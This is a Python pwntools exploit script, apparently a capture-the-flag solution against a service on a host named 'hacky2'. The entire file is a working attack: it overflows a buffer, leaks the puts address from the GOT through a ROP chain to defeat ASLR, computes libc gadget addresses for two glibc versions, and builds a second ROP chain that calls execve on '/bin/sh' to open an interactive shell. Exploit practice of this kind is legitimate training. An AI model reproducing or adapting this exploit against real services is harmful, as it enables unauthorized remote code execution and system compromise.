#!/usr/bin/python3

import sys
from pwn import *

#NOTE: relevant non-boilerplate code starts at line 80

#assign host and port to connect to
if len(sys.argv) >= 3:
    host = sys.argv[1]
    port = int(sys.argv[2])
else:
    host = "hacky2"
    port = 13705

proc=remote(host, port)

local_debug = False

vuln_pop_rdi_gadget  = p64(0x40134b)
puts_got_entry_addr  = p64(0x4033d0)
puts_plt_entry_addr  = p64(0x401030)
main_get_gadget_addr = p64(0x4011a9)
main_addr            = p64(0x4010a0)

proc.write(b"Indeed.\n")
proc.write(b"I tried so hard and got so far, but in the end it really didn't matter.\n");

libc_leak_exploit_str =  0x42*b"\x00"
libc_leak_exploit_str += vuln_pop_rdi_gadget
libc_leak_exploit_str += puts_got_entry_addr
libc_leak_exploit_str += puts_plt_entry_addr
libc_leak_exploit_str += main_addr
libc_leak_exploit_str += b'\n'

proc.write(libc_leak_exploit_str)

proc.readline()
proc.readline()

libc_puts_addr_str = proc.readline()[4:10]

###########################################################
#LOCAL ADDRESSES FOR DEBUGGING with Debian GLIBC 2.36-9
if local_debug:
    libc_puts_offset = 0x77820
#Actual Values for libc 2.31 deployed on hacky2
else: 
    libc_puts_offset = 0x735f0
###########################################################

libc_start_addr = int.from_bytes(libc_puts_addr_str, byteorder='little') - libc_puts_offset

###########################################################
#LOCAL ADDRESSES FOR DEBUGGING with Debian GLIBC 2.36-9
if local_debug:
    libc_ropgadget_pop_rax = p64(libc_start_addr + 0x3f0a7)
    libc_ropgadget_pop_rdi = p64(libc_start_addr + 0x27725)
    libc_ropgadget_pop_rsi = p64(libc_start_addr + 0x28ed9)
    libc_ropgadget_pop_rdx = p64(libc_start_addr + 0xfdc9d)
    libc_ropgadget_syscall = p64(libc_start_addr + 0x85fb1)
    libc_ropgadget_syscall_59 = p64(libc_start_addr + 0xd48d0)

    libc_string_bin_sh = p64(libc_start_addr + 0x196031)
    libc_ropgadget_mov_rdi_rbp_call_rax = p64(libc_start_addr + 0x9a470)
    libc_stdin_addr_str = p64(libc_start_addr + 0x1d1ec0)

    libc_system_addr_str = p64(libc_start_addr + 0x4c330)
#Actual Values for libc 2.31 deployed on hacky2
else:
    libc_ropgadget_pop_rdi    = p64(libc_start_addr + 0x23796)
    libc_ropgadget_pop_rsi    = p64(libc_start_addr + 0x2590f)
    libc_ropgadget_pop_rdx    = p64(libc_start_addr + 0xc8b8d)
    libc_ropgadget_syscall_59 = p64(libc_start_addr + 0xc9080)
###########################################################

exploit_str =  0x42*b"\x00" #b"Compilin' Park." 
exploit_str += libc_ropgadget_pop_rdi
exploit_str += p64(0x403500 + 8)
exploit_str += libc_ropgadget_pop_rsi
exploit_str += p64(0)
exploit_str += libc_ropgadget_pop_rdx
exploit_str += p64(0)
exploit_str += libc_ropgadget_syscall_59
#Buffer isn't long enough for returning to main (by one byte) after that ROP chain, 
#but once we have the flag we don't wanna do anything anyway, so in the end, it doesn't really matter.
#I'm still leaving it in here anyway:
exploit_str += main_addr 
exploit_str += b"\n"

proc.write(b"0\n")
proc.write(b"/bin/sh\x00I had to fall to lose it all, but in the end it didn't really matter.\n")
proc.readline()
proc.readline()

proc.write(exploit_str)
proc.interactive()


